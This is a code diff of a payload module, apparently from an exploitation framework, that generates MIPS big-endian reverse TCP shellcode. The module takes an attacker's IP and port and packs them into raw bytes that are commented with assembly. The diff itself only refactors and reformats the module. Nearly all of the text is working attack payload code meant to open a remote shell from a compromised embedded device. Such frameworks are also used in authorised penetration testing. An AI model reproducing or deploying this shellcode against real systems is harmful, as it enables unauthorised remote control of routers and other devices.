@@ -18,14 +18,17 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "mipsbe"
+
     target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
-    port = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
+    port = exploits.Option(
+        5555, 'Reverse TCP Port', validators=validators.integer
+    )
 
     def generate(self):
-        reverse_ip = self.convert_ip(self.target)
-        reverse_port = self.convert_port(self.port)
+        reverse_ip = validators.convert_ip(self.target)
+        reverse_port = validators.convert_port(self.port)
 
-        self.payload = (
+        return (
             "\x28\x04\xff\xff" +            # slti     a0,zero,-1
             "\x24\x02\x0f\xa6" +            # li       v0,4006
             "\x01\x09\x09\x0c" +            # syscall  0x42424
@@ -48,10 +51,10 @@ class Exploit(payloads.Payload):
             "\x24\x02\x0f\xc9" +            # li       v0,4041
             "\x01\x09\x09\x0c" +            # syscall  0x42424
             "\x3c\x05\x00\x02" +            # lui      a1,0x2
-            "\x34\xa5" + reverse_port +     # "\x7a\x69"  # ori      a1,a1,0x7a69
+            "\x34\xa5" + reverse_port +     # "\x7a\x69"  # ori   a1,a1,0x7a69
             "\xaf\xa5\xff\xf8" +            # sw       a1,-8(sp)
-            "\x3c\x05" + reverse_ip[:2] +   # "\xc0\xa8"  # lui      a1,0xc0a8
-            "\x34\xa5" + reverse_ip[2:] +   # "\x01\x37"  # ori      a1,a1,0x137
+            "\x3c\x05" + reverse_ip[:2] +   # "\xc0\xa8"  # lui   a1,0xc0a8
+            "\x34\xa5" + reverse_ip[2:] +   # "\x01\x37"  # or    a1,a1,0x137
             "\xaf\xa5\xff\xfc" +            # sw       a1,-4(sp)
             "\x23\xa5\xff\xf8" +            # addi     a1,sp,-8
             "\x24\x0c\xff\xef" +            # li       t4,-17
